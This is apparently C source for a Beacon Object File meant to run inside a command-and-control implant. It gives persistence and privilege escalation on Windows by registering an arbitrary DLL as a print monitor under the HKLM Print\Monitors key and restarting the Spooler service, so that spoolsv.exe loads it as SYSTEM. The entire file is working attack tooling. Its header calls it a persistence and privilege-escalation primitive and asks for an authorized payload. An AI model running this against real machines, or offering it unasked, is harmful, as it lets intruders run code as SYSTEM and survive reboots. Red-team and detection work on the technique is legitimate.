/*
 * bof-printmonitor <name> <dll-path|remove> [restart|norestart]
 *
 * Install a print monitor DLL by creating
 *   HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\<name>
 * with a REG_SZ `Driver` value pointing at the DLL.  The spooler loads the
 * monitor at service start.  `remove` deletes the key.
 *
 * By default the Spooler service is restarted so the monitor loads (or is
 * unloaded) immediately; pass `norestart` to leave the service alone.  The
 * restart briefly interrupts printing and requires administrator rights.
 *
 * This is a persistence / privilege-escalation primitive: the monitor DLL is
 * loaded by spoolsv.exe (SYSTEM).  Use only with an authorized payload.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define PRINT_MON_ROOT "SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\"

static int restart_spooler(int wait)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS st;
    SERVICE_STATUS_PROCESS stp;
    DWORD need = 0, waited = 0;
    int ok = -1;

    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManager failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return -1;
    }
    svc = ADVAPI32$OpenServiceA(scm, "Spooler", SERVICE_STOP | SERVICE_START |
                                SERVICE_QUERY_STATUS);
    if (!svc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenService(Spooler) failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scm);
        return -1;
    }

    bof_memzero(&st, sizeof(st));
    if (ADVAPI32$ControlService(svc, SERVICE_CONTROL_STOP, &st)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Spooler stopping...\n");
        for (waited = 0; waited < (DWORD)wait; waited++) {
            bof_memzero(&stp, sizeof(stp));
            if (ADVAPI32$QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                    (LPBYTE)&stp, sizeof(stp), &need) &&
                stp.dwCurrentState == SERVICE_STOPPED)
                break;
            KERNEL32$Sleep(250);
        }
    } else {
        DWORD e = KERNEL32$GetLastError();
        if (e != ERROR_SERVICE_NOT_ACTIVE)
            BeaconPrintf(CALLBACK_OUTPUT, "[!] stop returned %lu\n",
                         (unsigned long)e);
    }

    if (ADVAPI32$StartServiceA(svc, 0, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spooler started\n");
        ok = 0;
    } else {
        DWORD e = KERNEL32$GetLastError();
        if (e == ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Spooler already running\n");
            ok = 0;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "StartService(Spooler) failed: %lu\n",
                         (unsigned long)e);
        }
    }

    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
    return ok;
}

void go(char *args, int alen)
{
    datap parser;
    char *name, *dll, *restartarg = "restart";
    int nlen, dlen, rlen;
    char keypath[1024];
    HKEY key = NULL;
    DWORD disp = 0;
    LONG rc;
    int remove, restart;

    BeaconDataParse(&parser, args, alen);
    name = BeaconDataExtract(&parser, &nlen);
    dll  = BeaconDataExtract(&parser, &dlen);
    restartarg = BeaconDataExtract(&parser, &rlen);
    if (!name || !name[0] || !dll || !dll[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: printmonitor <name> <dll-path|remove> [restart|norestart]\n");
        return;
    }
    if (!restartarg) restartarg = "restart";
    remove  = bof_stricmp(dll, "remove") == 0 || bof_stricmp(dll, "delete") == 0;
    restart = bof_stricmp(restartarg, "norestart") != 0 &&
              bof_stricmp(restartarg, "no") != 0;

    if (bof_strchr(name, '\\') || bof_strchr(name, '/')) {
        BeaconPrintf(CALLBACK_ERROR, "monitor name must not contain path separators\n");
        return;
    }
    bof_strncpy(keypath, PRINT_MON_ROOT, sizeof(keypath));
    bof_strncat(keypath, name, sizeof(keypath) - bof_strlen(keypath) - 1);

    if (remove) {
        rc = ADVAPI32$RegDeleteTreeA(HKEY_LOCAL_MACHINE, keypath);
        if (rc == ERROR_SUCCESS || rc == ERROR_FILE_NOT_FOUND)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] monitor key removed: %s\n", keypath);
        else
            BeaconPrintf(CALLBACK_ERROR, "RegDeleteTree failed: %lu (admin?)\n",
                         (unsigned long)rc);
        if (restart) restart_spooler(40);
        return;
    }

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, keypath, 0, NULL, 0,
                                  KEY_WRITE, NULL, &key, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %lu (admin?)\n",
                     (unsigned long)rc);
        return;
    }
    rc = ADVAPI32$RegSetValueExA(key, "Driver", 0, REG_SZ,
                                 (const BYTE *)dll,
                                 (DWORD)bof_strlen(dll) + 1);
    ADVAPI32$RegCloseKey(key);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx(Driver) failed: %lu\n",
                     (unsigned long)rc);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] print monitor registered\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    key   : HKLM\\%s\n", keypath);
    BeaconPrintf(CALLBACK_OUTPUT, "    driver: %s\n", dll);
    if (restart)
        restart_spooler(40);
    else
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] restart the Spooler service to load the monitor\n");
}
